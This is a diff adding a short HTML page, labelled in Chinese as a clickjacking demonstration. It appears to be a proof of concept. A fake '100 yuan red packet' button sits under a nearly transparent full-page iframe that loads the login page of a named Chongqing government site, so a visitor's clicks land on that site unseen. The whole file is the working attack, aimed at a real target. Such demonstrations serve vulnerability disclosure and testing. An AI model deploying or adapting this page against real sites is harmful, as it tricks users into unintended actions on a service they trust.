@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>点击劫持危害演示（模拟攻击）</title>
+    <style>
+        body {
+            font-family: "Microsoft YaHei", sans-serif;
+            text-align: center;
+            margin-top: 100px;
+        }
+        /* 伪装成“福利领取”的按钮 */
+        .fake-btn {
+            font-size: 28px;
+            padding: 20px 40px;
+            background-color: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        /* 关键：透明iframe覆盖在按钮上方，用户以为在点按钮，实际在点登录框 */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.1; /* 透明度极低，用户看不到真实页面 */
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>点击下方按钮领取100元红包！</h2>
+    <button class="fake-btn">立即领取</button>
+
+    <!-- 目标站点登录页，嵌入iframe中 -->
+    <iframe src="https://ywt.scjgj.cq.gov.cn/login"></iframe>
+</body>
+</html>
